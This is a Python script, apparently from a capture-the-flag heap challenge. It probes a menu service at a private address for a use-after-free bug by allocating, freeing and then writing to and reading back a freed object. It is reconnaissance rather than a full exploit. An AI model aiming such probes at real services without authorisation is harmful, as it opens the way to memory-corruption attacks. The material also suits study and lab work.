import socket
import time

host = "10.2.0.5"
port = 10004


def recv_until(s, delim):
    data = b""
    while not data.endswith(delim):
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def analyze():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Read banner
    print(recv_until(s, b"> ").decode())

    # 1. Allocate A
    print("Sending 1 (Allocate A)...")
    s.sendall(b"1\n")
    print(recv_until(s, b"> ").decode())

    # 2. Allocate B
    print("Sending 2 (Allocate B)...")
    s.sendall(b"2\n")
    print(recv_until(s, b"> ").decode())

    # 7. Show B
    print("Sending 7 (Show B)...")
    s.sendall(b"7\n")
    output = recv_until(s, b"> ").decode()
    print(f"Output of Show B:\n{output}")

    # 3. Free A
    print("Sending 3 (Free A)...")
    s.sendall(b"3\n")
    print(recv_until(s, b"> ").decode())

    # 5. Write A (UAF test)
    print("Sending 5 (Write A)...")
    s.sendall(b"5\n")
    # Try sending data
    s.sendall(b"AAAA\n")
    output = recv_until(s, b"> ").decode()
    print(f"Output of Write A:\n{output}")

    # 6. Show A
    print("Sending 6 (Show A)...")
    s.sendall(b"6\n")
    output = recv_until(s, b"> ").decode()
    print(f"Output of Show A:\n{output}")

    s.close()


if __name__ == "__main__":
    analyze()
